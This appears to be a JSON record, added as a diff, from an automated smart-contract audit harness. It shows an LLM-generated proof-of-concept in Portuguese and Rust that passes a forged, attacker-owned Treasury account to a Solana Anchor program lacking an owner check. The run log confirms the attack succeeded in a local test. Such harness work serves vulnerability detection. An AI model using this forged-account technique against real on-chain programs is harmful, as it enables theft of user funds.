@@ -1,0 +1,91 @@
+{
+  "category": "OWNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: conta forjada com dono diferente foi aceita e usada",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2424,
+        "completion_tokens": 695,
+        "latency_s": 3.68
+      },
+      "raw": "{\n  \"plan\": \"Preparamos uma conta forjada cujo dono é um programa atacante (env.attacker_program) e cujos dados imitam o layout de Treasury (authority, balance, is_active=true). O baseline usa a instrução initialize para criar uma treasury legítima e provar que o cenário está montado corretamente. O ataque chama process passando a conta forjada como treasury, com a menor mudança possível. O efeito medido é que a conta forjada foi aceita e usada: o programa leu os dados forjados sem verificar o dono, e a execução teve sucesso.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\\n\\n// Conta forjada: dono é o programa atacante, dados imitam Treasury\\nlet forged_data = anchor_account_data(\\\"Treasury\\\", &(authority, 999u64, true));\\nlet forged_treasury = account(&attacker_program, &forged_data, None);\\n\\n// Baseline: initialize cria uma treasury legítima\\nlet treasury_key = Pubkey::new_unique();\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(treasury_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\nlet init_accounts = vec![\\n    (treasury_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    system_program_account(),\\n];\\nlet baseline_result = env.baseline(\\\"initialize legitimo\\\", &init_ix, &init_accounts);\\n\\n// Ataque: process com a conta forjada como treasury\\nlet attack_ix = env.anchor_ix(\\n    \\\"process\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new_readonly(forged_treasury_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (forged_treasury_key, forged_treasury),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"process com treasury forjada\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let after_forged = after(&attack_result, &forged_treasury_key);\\n    env.effect(\\n        \\\"conta forjada com dono diferente foi aceita e usada\\\",\\n        after_forged.owner() == &attacker_program && after_forged.data() == forged_data.as_slice(),\\n    );\\n}\"\n}",
+      "plan": "Preparamos uma conta forjada cujo dono é um programa atacante (env.attacker_program) e cujos dados imitam o layout de Treasury (authority, balance, is_active=true). O baseline usa a instrução initialize para criar uma treasury legítima e provar que o cenário está montado corretamente. O ataque chama process passando a conta forjada como treasury, com a menor mudança possível. O efeito medido é que a conta forjada foi aceita e usada: o programa leu os dados forjados sem verificar o dono, e a execução teve sucesso.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\n\n// Conta forjada: dono é o programa atacante, dados imitam Treasury\nlet forged_data = anchor_account_data(\"Treasury\", &(authority, 999u64, true));\nlet forged_treasury = account(&attacker_program, &forged_data, None);\n\n// Baseline: initialize cria uma treasury legítima\nlet treasury_key = Pubkey::new_unique();\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(treasury_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\nlet init_accounts = vec![\n    (treasury_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    system_program_account(),\n];\nlet baseline_result = env.baseline(\"initialize legitimo\", &init_ix, &init_accounts);\n\n// Ataque: process com a conta forjada como treasury\nlet attack_ix = env.anchor_ix(\n    \"process\",\n    &(),\n    vec![\n        AccountMeta::new_readonly(forged_treasury_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet attack_accounts = vec![\n    (forged_treasury_key, forged_treasury),\n    (authority, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"process com treasury forjada\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let after_forged = after(&attack_result, &forged_treasury_key);\n    env.effect(\n        \"conta forjada com dono diferente foi aceita e usada\",\n        after_forged.owner() == &attacker_program && after_forged.data() == forged_data.as_slice(),\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `forged_treasury_key` in this scope\n  --> tests/attempt.rs:39:39\n   |\n39 |             AccountMeta::new_readonly(forged_treasury_key, false),\n   |                                       ^^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n39 -             AccountMeta::new_readonly(forged_treasury_key, false),\n39 +             AccountMeta::new_readonly(forged_treasury, false),\n   |\n\nerror[E0425]: cannot find value `forged_treasury_key` in this scope\n  --> tests/attempt.rs:44:10\n   |\n44 |         (forged_treasury_key, forged_treasury),\n   |          ^^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n44 -         (forged_treasury_key, forged_treasury),\n44 +         (forged_treasury, forged_treasury),\n   |\n\nerror[E0425]: cannot find value `forged_treasury_key` in this scope\n  --> tests/attempt.rs:50:51\n   |\n50 |         let after_forged = after(&attack_result, &forged_treasury_key);\n   |                                                   ^^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n50 -         let after_forged = after(&attack_result, &forged_treasury_key);\n50 +         let after_forged = after(&attack_result, &forged_treasury);\n   |\n\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 3 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `forged_treasury_key` in this scope\n  --> tests/attempt.rs:39:39\n   |\n39 |             AccountMeta::new_readonly(forged_treasury_key, false),\n   |                                       ^^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n39 -             AccountMeta::new_readonly(forged_treasury_key, false),\n39 +             AccountMeta::new_readonly(forged_treasury, false),\n   |\n\nerror[E0425]: cannot find value `forged_treasury_key` in this scope\n  --> tests/attempt.rs:44:10\n   |\n44 |         (forged_treasury_key, forged_treasury),\n   |          ^^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n44 -         (forged_treasury_key, forged_treasury),\n44 +         (forged_treasury, forged_treasury),\n   |\n\nerror[E0425]: cannot find value `forged_treasury_key` in this scope\n  --> tests/attempt.rs:50:51\n   |\n50 |         let after_forged = after(&attack_result, &forged_treasury_key);\n   |                                                   ^^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n50 -         let after_forged = after(&attack_result, &forged_treasury_key);\n50 +         let after_forged = after(&attack_result, &forged_treasury);\n   |\n\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 3 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3314,
+        "completion_tokens": 686,
+        "latency_s": 3.3
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta forjada cujo dono é o programa atacante e cujos dados imitam o layout de Treasury (authority, balance, is_active=true). O baseline chama initialize legitimamente para provar que o cenário está montado corretamente. O ataque chama process passando a conta forjada como treasury, sem verificação de dono. O efeito mede que a conta forjada, com dono diferente do programa, foi aceita e usada (execução bem-sucedida).\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\\n\\n// Conta forjada: dono é o programa atacante, dados imitam Treasury\\nlet forged_data = anchor_account_data(\\\"Treasury\\\", &(authority, 999u64, true));\\nlet forged_treasury_key = Pubkey::new_unique();\\nlet forged_treasury = account(&attacker_program, &forged_data, None);\\n\\n// Baseline: initialize cria uma treasury legítima\\nlet treasury_key = Pubkey::new_unique();\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(treasury_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\\n    ],\\n);\\nlet init_accounts = vec![\\n    (treasury_key, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    system_program_account(),\\n];\\nlet baseline_result = env.baseline(\\\"initialize legitimo\\\", &init_ix, &init_accounts);\\n\\n// Ataque: process com a conta forjada como treasury\\nlet attack_ix = env.anchor_ix(\\n    \\\"process\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new_readonly(forged_treasury_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (forged_treasury_key, forged_treasury),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"process com treasury forjada\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let after_forged = after(&attack_result, &forged_treasury_key);\\n    env.effect(\\n        \\\"conta forjada com dono diferente foi aceita e usada\\\",\\n        after_forged.owner() == &attacker_program && after_forged.data() == forged_data.as_slice(),\\n    );\\n}\"\n}",
+      "plan": "Preparo uma conta forjada cujo dono é o programa atacante e cujos dados imitam o layout de Treasury (authority, balance, is_active=true). O baseline chama initialize legitimamente para provar que o cenário está montado corretamente. O ataque chama process passando a conta forjada como treasury, sem verificação de dono. O efeito mede que a conta forjada, com dono diferente do programa, foi aceita e usada (execução bem-sucedida).",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\n\n// Conta forjada: dono é o programa atacante, dados imitam Treasury\nlet forged_data = anchor_account_data(\"Treasury\", &(authority, 999u64, true));\nlet forged_treasury_key = Pubkey::new_unique();\nlet forged_treasury = account(&attacker_program, &forged_data, None);\n\n// Baseline: initialize cria uma treasury legítima\nlet treasury_key = Pubkey::new_unique();\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(treasury_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(solana_program::system_program::id(), false),\n    ],\n);\nlet init_accounts = vec![\n    (treasury_key, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    system_program_account(),\n];\nlet baseline_result = env.baseline(\"initialize legitimo\", &init_ix, &init_accounts);\n\n// Ataque: process com a conta forjada como treasury\nlet attack_ix = env.anchor_ix(\n    \"process\",\n    &(),\n    vec![\n        AccountMeta::new_readonly(forged_treasury_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet attack_accounts = vec![\n    (forged_treasury_key, forged_treasury),\n    (authority, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"process com treasury forjada\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let after_forged = after(&attack_result, &forged_treasury_key);\n    env.effect(\n        \"conta forjada com dono diferente foi aceita e usada\",\n        after_forged.owner() == &attacker_program && after_forged.data() == forged_data.as_slice(),\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo",
+            "result": "Success",
+            "compute_units": 12972,
+            "account_flags": "sw,sw,-r"
+          },
+          {
+            "step": "attack",
+            "note": "process com treasury forjada",
+            "result": "Success",
+            "compute_units": 8482,
+            "account_flags": "-r,sr"
+          },
+          {
+            "step": "effect",
+            "note": "conta forjada com dono diferente foi aceita e usada",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 12972 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 8482 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: conta forjada com dono diferente foi aceita e usada"
+    }
+  ],
+  "case_id": "SSP-02-A-V",
+  "static_finding": {
+    "category": "OWNER",
+    "confidence": "high",
+    "evidence": "pub treasury: AccountInfo<'info>,\n...\nlet data = ctx.accounts.treasury.try_borrow_data()?;",
+    "explanation": "A conta `treasury` e recebida como `AccountInfo` e seus dados sao lidos diretamente via `try_borrow_data()` sem qualquer verificacao de que `treasury.owner` seja o programa atual. Diferente do tipo `Account<'info, T>`, o `AccountInfo` nao valida o proprietario, permitindo que uma conta forjada, pertencente a outro programa, seja passada com dados arbitrarios.",
+    "attack_hypothesis": "Um atacante cria uma conta cujo proprietario e um programa malicioso (ou qualquer programa que ele controle) e grava bytes que imitam o layout de `Treasury` (authority, balance, is_active = true). Ao passar essa conta como `treasury` na instrucao `process`, o programa le os dados forjados sem perceber que a conta nao pertence ao programa, contornando a validacao de estado."
+  }
+}
